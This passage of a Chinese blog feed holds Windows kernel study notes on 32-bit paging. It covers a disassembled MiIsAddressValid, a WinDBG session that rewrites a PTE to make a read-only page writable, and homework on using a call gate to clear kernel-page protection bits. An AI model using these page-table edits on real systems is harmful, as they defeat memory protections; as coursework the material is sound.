; (eax &gt;&gt; <span class="number">20</span>) &amp; ffc</span><br><span class="line">.text:<span class="number">0048</span>DBC2                 sub     eax, <span class="number">3F</span>D00000h</span><br><span class="line">.text:<span class="number">0048</span>DBC7                 mov     eax, [eax]      ; C0300000是一个起始地址</span><br><span class="line">.text:<span class="number">0048</span>DBC9                 test    al, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0048</span>DBCB                 jnz     <span class="type">short</span> loc_48DBD0</span><br><span class="line">.text:<span class="number">0048</span>DBCD</span><br><span class="line">.text:<span class="number">0048</span>DBCD loc_48DBCD:                             ; CODE XREF: <span class="built_in">MiIsAddressValid</span>(x,x)+<span class="number">32</span>↓j</span><br><span class="line">.text:<span class="number">0048</span>DBCD                 <span class="keyword">xor</span>     al, al</span><br><span class="line">.text:<span class="number">0048</span>DBCF                 retn</span><br><span class="line">.text:<span class="number">0048</span>DBD0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0048</span>DBD0</span><br><span class="line">.text:<span class="number">0048</span>DBD0 loc_48DBD0:                             ; CODE XREF: <span class="built_in">MiIsAddressValid</span>(x,x)+<span class="number">13</span>↑j</span><br><span class="line">.text:<span class="number">0048</span>DBD0                 test    al, al</span><br><span class="line">.text:<span class="number">0048</span>DBD2                 jns     <span class="type">short</span> loc_48DBD7 ; 判断是否是大页</span><br><span class="line">.text:<span class="number">0048</span>DBD4                 mov     al, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0048</span>DBD6                 retn</span><br><span class="line">.text:<span class="number">0048</span>DBD7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0048</span>DBD7</span><br><span class="line">.text:<span class="number">0048</span>DBD7 loc_48DBD7:                             ; CODE XREF: <span class="built_in">MiIsAddressValid</span>(x,x)+<span class="number">1</span>A↑j</span><br><span class="line">.text:<span class="number">0048</span>DBD7                 shr     ecx, <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0048</span>DBDA                 <span class="keyword">and</span>     ecx, <span class="number">3F</span>FFFCh</span><br><span class="line">.text:<span class="number">0048</span>DBE0                 sub     ecx, <span class="number">40000000</span>h  ; C0000000</span><br><span class="line">.text:<span class="number">0048</span>DBE6                 mov     eax, [ecx]</span><br><span class="line">.text:<span class="number">0048</span>DBE8                 test    al, <span class="number">1</span>           ; PTE</span><br><span class="line">.text:<span class="number">0048</span>DBEA                 jz      <span class="type">short</span> loc_48DBCD</span><br><span class="line">.text:<span class="number">0048</span>DBEC                 <span class="keyword">and</span>     al, <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">0048</span>DBEE                 cmp     al, <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">0048</span>DBF0                 setnz   al</span><br><span class="line">.text:<span class="number">0048</span>DBF3                 retn</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>C0300000 PDE基址<br>C0300000 + ((线性地址 &gt;&gt; 0x14) &amp; 0xFFC)</p></blockquote><blockquote><p>C0000000 PTE基址<br>C000000 + ((线性地址 &gt;&gt; 0xA) &amp; 0x3FFFFC)</p></blockquote><h3 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h3><blockquote><p>最大能支持36根地址总线<br>2^32 &#x3D; 4G<br>2^33 &#x3D; 4G * 2 &#x3D; 8G<br>2^36 &#x3D; 4G*2^4 &#x3D; 64G</p></blockquote><h2 id="2-9-9-12分页"><a href="#2-9-9-12分页" class="headerlink" title="2-9-9-12分页"></a>2-9-9-12分页</h2><blockquote><ol><li>2^2 &#x3D; 4, 有4种（00, 01, 10, 11）, 所以CR3是以0x20来递增的;</li></ol></blockquote><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><ol><li>2-9-9-12拆法;</li><li>逆向分析2-9-9-12分页模式下内核函数MmIsAddressValied;</li><li>通过调用门进入R0修改高2G的所有PDE、PTE的u&#x2F;s位, 然后返回应用层访问高地址, 分页模式10-10-12;</li></ol>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-页表</title>
      <link href="/1d0822fc.html"/>
      <url>/1d0822fc.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>页表</strong></p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="内核文件"><a href="#内核文件" class="headerlink" title="内核文件"></a>内核文件</h3><blockquote><p>32位特有的</p></blockquote><ul><li>如果是29912分页, 运行的内核 ntkrnlpa.exe;</li><li>如果是101012分页, 运行的内核 ntoskrnl.exe;</li></ul><blockquote><p>C:\Windows\System32\drivers目录下保存的都是一些系统驱动;</p></blockquote><blockquote><ol><li>线性地址一致, 为什么内存数据不一致</li><li>物理内存小于虚拟内存</li></ol></blockquote><h3 id="物理地址的拆分"><a href="#物理地址的拆分" class="headerlink" title="物理地址的拆分"></a>物理地址的拆分</h3><blockquote><p>10-10-12分页拆分</p></blockquote><ol><li>在notepad中键入字符串后使用CE找到该字符串的逻辑地址: 0009DE08</li><li>拆分地址<br>0009DE08 &#x3D;&gt; 0000 0000 0000 | 0000 1001 1101 | 1110 0000 1000<br>0000 0000 0000  &#x3D;&gt; 0        &#x2F;&#x2F; 页目录项<br>0000 1001 1101  &#x3D;&gt; 09D      &#x2F;&#x2F; 页表项<br>1110 0000 1000  &#x3D;&gt; E08      &#x2F;&#x2F; 页内偏移</li><li>在WinDBG中查找<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先使用命令!process 0 0找到notepad进程的CR3</span></span><br><span class="line"><span class="comment">// 注意：物理内存要使用感叹号(!)</span></span><br><span class="line"></span><br><span class="line">kd&gt; !dd <span class="number">32f</span>99000            <span class="comment">// notepad进程的CR3（代表这本书）</span></span><br><span class="line">#<span class="number">32f</span>99000 <span class="number">1</span>c1ce867 <span class="number">25e09867</span> <span class="number">1</span>c16c867 <span class="number">18485867</span></span><br><span class="line">#<span class="number">32f</span>99010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99020 <span class="number">05265867</span> <span class="number">17</span>c66867 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">32f</span>99000+<span class="number">0</span>*<span class="number">4</span>        <span class="comment">// 每一项代表的是指针, 32位下为4字节, 所以需要乘以4</span></span><br><span class="line">#<span class="number">32f</span>99000 <span class="number">1</span>c1ce867 <span class="number">25e09867</span> <span class="number">1</span>c16c867 <span class="number">18485867</span></span><br><span class="line">#<span class="number">32f</span>99010 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99020 <span class="number">05265867</span> <span class="number">17</span>c66867 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99030 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99040 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99050 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99060 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">32f</span>99070 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">1</span>c1ce000+<span class="number">09</span>D*<span class="number">4</span>      <span class="comment">// 去除最后的12位（后面的12位在页目录下代表了注意事项, 也就是属性）, 然后加上页表项09D</span></span><br><span class="line">#<span class="number">1</span>c1ce274 <span class="number">2</span>cea5867 <span class="number">212f</span>c867 <span class="number">27</span>c7e867 <span class="number">2</span>d13f867</span><br><span class="line">#<span class="number">1</span>c1ce284 <span class="number">20f</span>43867 <span class="number">28843867</span> <span class="number">286</span>c3867 <span class="number">03244867</span></span><br><span class="line">#<span class="number">1</span>c1ce294 <span class="number">02b</span>85847 <span class="number">3038b</span>867 <span class="number">0</span>a4ca847 <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c1ce2a4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c1ce2b4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c1ce2c4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c1ce2d4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1</span>c1ce2e4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">2</span>cea5000+E08        <span class="comment">// 同样去除后12位后加上页内偏移后找到这个字</span></span><br><span class="line">#<span class="number">2</span>cea5e08 <span class="number">00620061</span> <span class="number">00640063</span> <span class="number">00320031</span> <span class="number">00340033</span></span><br><span class="line">#<span class="number">2</span>cea5e18 <span class="number">00370035</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2</span>cea5e28 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2</span>cea5e38 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">2</span>cea5e48 <span class="number">00000000</span> <span class="number">005f</span>0004 <span class="number">59f</span>3c08e <span class="number">0800730b</span></span><br><span class="line">#<span class="number">2</span>cea5e58 <span class="number">000</span>a1aa0 <span class="number">000</span>a1c20 <span class="number">5</span>cf3c08b <span class="number">08007303</span></span><br><span class="line">#<span class="number">2</span>cea5e68 <span class="number">00000409</span> <span class="number">0019f</span>2e0 <span class="number">0019f</span>220 <span class="number">0019f</span>2e0</span><br><span class="line">#<span class="number">2</span>cea5e78 <span class="number">001865</span>cc <span class="number">00000003</span> <span class="number">0019</span>ee7c <span class="number">00000000</span></span><br><span class="line">kd&gt; !db <span class="number">2</span>cea5000+E08</span><br><span class="line">#<span class="number">2</span>cea5e08 <span class="number">61</span> <span class="number">00</span> <span class="number">62</span> <span class="number">00</span> <span class="number">63</span> <span class="number">00</span> <span class="number">64</span> <span class="number">00</span><span class="number">-31</span> <span class="number">00</span> <span class="number">32</span> <span class="number">00</span> <span class="number">33</span> <span class="number">00</span> <span class="number">34</span> <span class="number">00</span> a.b.c.d<span class="number">.1</span><span class="number">.2</span><span class="number">.3</span><span class="number">.4</span>.</span><br><span class="line">#<span class="number">2</span>cea5e18 <span class="number">35</span> <span class="number">00</span> <span class="number">37</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">5.7</span>.............</span><br><span class="line">#<span class="number">2</span>cea5e28 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">2</span>cea5e38 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line">#<span class="number">2</span>cea5e48 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">5f</span> <span class="number">00</span><span class="number">-8</span>e c0 f3 <span class="number">59</span> <span class="number">0b</span> <span class="number">73</span> <span class="number">00</span> <span class="number">08</span> ......_....Y.s..</span><br><span class="line">#<span class="number">2</span>cea5e58 a0 <span class="number">1</span>a <span class="number">0</span>a <span class="number">00</span> <span class="number">20</span> <span class="number">1</span>c <span class="number">0</span>a <span class="number">00</span><span class="number">-8b</span> c0 f3 <span class="number">5</span>c <span class="number">03</span> <span class="number">73</span> <span class="number">00</span> <span class="number">08</span> .... ......\.s..</span><br><span class="line">#<span class="number">2</span>cea5e68 <span class="number">09</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> e0 f2 <span class="number">19</span> <span class="number">00</span><span class="number">-20</span> f2 <span class="number">19</span> <span class="number">00</span> e0 f2 <span class="number">19</span> <span class="number">00</span> ........ .......</span><br><span class="line">#<span class="number">2</span>cea5e78 cc <span class="number">65</span> <span class="number">18</span> <span class="number">00</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-7</span>c ee <span class="number">19</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> .e......|.......</span><br></pre></td></tr></table></figure></li></ol><h3 id="计算一次缓存的字节数"><a href="#计算一次缓存的字节数" class="headerlink" title="计算一次缓存的字节数"></a>计算一次缓存的字节数</h3><blockquote><p>总字节数 &#x2F; linesize &#x2F; x way &#x3D; y组<br>y 组 &#x2F; x way &#x3D; 1组z行     z行 * linesize &#x3D; 一组缓存的字节数<br>(32K * 1024) &#x2F; 64 &#x2F; 8 &#x3D; 总组数（64）<br>64（总组数） &#x2F; 8 &#x3D; 8行<br>8 * 64字节 &#x3D; 512组的字节数</p></blockquote><h2 id="P-US-RW"><a href="#P-US-RW" class="headerlink" title="P_US_RW"></a>P_US_RW</h2><blockquote><p>PDE和PTE是与的关系（PDE.arr &amp; PTE.arr）, 最后得出为1的才是有效的;</p></blockquote><h3 id="P位"><a href="#P位" class="headerlink" title="P位"></a>P位</h3><blockquote><p>如果是PDE的P位置0, 那么代表PTT为无效;<br>如果是PTE的P为置0, 那么代表物理页为无效;</p></blockquote><h3 id="R-W位"><a href="#R-W位" class="headerlink" title="R&#x2F;W位"></a>R&#x2F;W位</h3><blockquote><p>R&#x2F;W位为0, 代表只读;<br>R&#x2F;W位为1, 代表可写;</p></blockquote><h4 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h4><blockquote><ol><li>拆分地址<br>a57 b30 &#x3D;&gt; 0000 0000 10 | 10 0101 0111 | 1011 0011 0000<br>0000 0000 0010  &#x3D;&gt; 2<br>0010 0101 0111  &#x3D;&gt; 257<br>1011 0011 0000  &#x3D;&gt; b30</li></ol></blockquote><blockquote><ol start="2"><li>WinDBG中设置</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">1622e000</span>+<span class="number">2</span>*<span class="number">4</span>        <span class="comment">// 1622e000为实验程序的CR3, PDE(18996867)最后一位为7(0111), 证明可写</span></span><br><span class="line">#<span class="number">1622e008</span> <span class="number">18996867</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e018</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e028</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e038</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e048</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e058</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e068</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1622e078</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !dd <span class="number">18996000</span>+<span class="number">257</span>*<span class="number">4</span>      <span class="comment">// 去除后12位加上页表项乘以4, PTE(0abb8005)最后一位为5(0101), 证明不可写</span></span><br><span class="line">#<span class="number">1899695</span>c <span class="number">0</span>abb8005 <span class="number">1</span>cc79005 <span class="number">00000000</span> <span class="number">19352847</span></span><br><span class="line">#<span class="number">1899696</span>c <span class="number">31b</span>a6005 <span class="number">09e2</span>f205 <span class="number">3685e005</span> <span class="number">3</span>d0da005</span><br><span class="line">#<span class="number">1899697</span>c <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1899698</span>c <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">1899699</span>c <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">189969</span>ac <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">189969b</span>c <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">#<span class="number">189969</span>cc <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line">kd&gt; !ed <span class="number">1899695</span>c <span class="number">0</span>abb8007   <span class="comment">// 将0abb8005修改为0abb8007, PTE(0abb8007)最后一位为7(0111), &amp;之后R/W位为1, 修改为可写状态</span></span><br><span class="line">kd&gt; !dd <span class="number">0</span>abb8000+b30</span><br><span class="line"># abb8b30 <span class="number">61647361</span> <span class="number">73676473</span> <span class="number">00616664</span> <span class="number">00000000</span></span><br><span class="line"># abb8b40 <span class="number">0</span>a0d7825 <span class="number">00000000</span> <span class="number">73756170</span> <span class="number">00000065</span></span><br><span class="line"># abb8b50 <span class="number">0</span>a0d7325 <span class="number">00000000</span> <span class="number">00</span>a57c18 <span class="number">00</span>a57d28</span><br><span class="line"># abb8b60 <span class="number">00</span>a57e80 <span class="number">00</span>a57ea4 <span class="number">00</span>a57ee4 <span class="number">00</span>a57f18</span><br><span class="line"># abb8b70 <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">00000001</span> <span class="number">00000001</span></span><br><span class="line"># abb8b80 <span class="number">00000001</span> <span class="number">00000001</span> <span class="number">63617453</span> <span class="number">7261206b</span></span><br><span class="line"># abb8b90 <span class="number">646e756</span>f <span class="number">65687420</span> <span class="number">72617620</span> <span class="number">6</span>c626169</span><br><span class="line"># abb8ba0 <span class="number">00272065</span> <span class="number">61772027</span> <span class="number">6f</span>632073 <span class="number">70757272</span></span><br><span class="line">kd&gt; !db <span class="number">0</span>abb8000+b30       <span class="comment">// 实验程序中的字符串</span></span><br><span class="line"># abb8b30 <span class="number">61</span> <span class="number">73</span> <span class="number">64</span> <span class="number">61</span> <span class="number">73</span> <span class="number">64</span> <span class="number">67</span> <span class="number">73</span><span class="number">-64</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> asdasdgsdfa.....</span><br><span class="line"># abb8b40 <span class="number">25</span> <span class="number">78</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-70</span> <span class="number">61</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> %x......pause...</span><br><span class="line"># abb8b50 <span class="number">25</span> <span class="number">73</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-18</span> <span class="number">7</span>c a5 <span class="number">00</span> <span class="number">28</span> <span class="number">7</span>d a5 <span class="number">00</span> %s.......|..(&#125;..</span><br><span class="line"># abb8b60 <span class="number">80</span> <span class="number">7</span>e a5 <span class="number">00</span> a4 <span class="number">7</span>e a5 <span class="number">00</span>-e4 <span class="number">7</span>e a5 <span class="number">00</span> <span class="number">18</span> <span class="number">7f</span> a5 <span class="number">00</span> .~...~...~......</span><br><span class="line"># abb8b70 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># abb8b80 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-53</span> <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6b</span> <span class="number">20</span> <span class="number">61</span> <span class="number">72</span> ........Stack ar</span><br><span class="line"># abb8b90 <span class="number">6f</span> <span class="number">75</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">20</span> <span class="number">74</span> <span class="number">68</span> <span class="number">65</span><span class="number">-20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c ound the variabl</span><br><span class="line"># abb8ba0 <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span><span class="number">-73</span> <span class="number">20</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">72</span> <span class="number">75</span> <span class="number">70</span> e <span class="string">&#x27;.&#x27;</span> was corrup</span><br><span class="line">kd&gt; g</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line"><span class="number">84066</span>ed0 cc              <span class="type">int</span>     <span class="number">3</span></span><br><span class="line">kd&gt; !db <span class="number">0</span>abb8000+b30        <span class="comment">// 已经被修改</span></span><br><span class="line"># abb8b30 <span class="number">31</span> <span class="number">73</span> <span class="number">64</span> <span class="number">61</span> <span class="number">73</span> <span class="number">64</span> <span class="number">67</span> <span class="number">73</span><span class="number">-64</span> <span class="number">66</span> <span class="number">61</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1</span>sdasdgsdfa.....</span><br><span class="line"># abb8b40 <span class="number">25</span> <span class="number">78</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-70</span> <span class="number">61</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> %x......pause...</span><br><span class="line"># abb8b50 <span class="number">25</span> <span class="number">73</span> <span class="number">0</span>d <span class="number">0</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-18</span> <span class="number">7</span>c a5 <span class="number">00</span> <span class="number">28</span> <span class="number">7</span>d a5 <span class="number">00</span> %s.......|..(&#125;..</span><br><span class="line"># abb8b60 <span class="number">80</span> <span class="number">7</span>e a5 <span class="number">00</span> a4 <span class="number">7</span>e a5 <span class="number">00</span>-e4 <span class="number">7</span>e a5 <span class="number">00</span> <span class="number">18</span> <span class="number">7f</span> a5 <span class="number">00</span> .~...~...~......</span><br><span class="line"># abb8b70 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> ................</span><br><span class="line"># abb8b80 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-53</span> <span class="number">74</span> <span class="number">61</span> <span class="number">63</span> <span class="number">6b</span> <span class="number">20</span> <span class="number">61</span> <span class="number">72</span> ........Stack ar</span><br><span class="line"># abb8b90 <span class="number">6f</span> <span class="number">75</span> <span class="number">6</span>e <span class="number">64</span> <span class="number">20</span> <span class="number">74</span> <span class="number">68</span> <span class="number">65</span><span class="number">-20</span> <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">69</span> <span class="number">61</span> <span class="number">62</span> <span class="number">6</span>c ound the variabl</span><br><span class="line"># abb8ba0 <span class="number">65</span> <span class="number">20</span> <span class="number">27</span> <span class="number">00</span> <span class="number">27</span> <span class="number">20</span> <span class="number">77</span> <span class="number">61</span><span class="number">-73</span> <span class="number">20</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">72</span> <span class="number">72</span> <span class="number">75</span> <span class="number">70</span> e <span class="string">&#x27;.&#x27;</span> was corrup</span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li>代码</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_14_PageProperties(页属性).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> *x = (<span class="type">char</span>*)<span 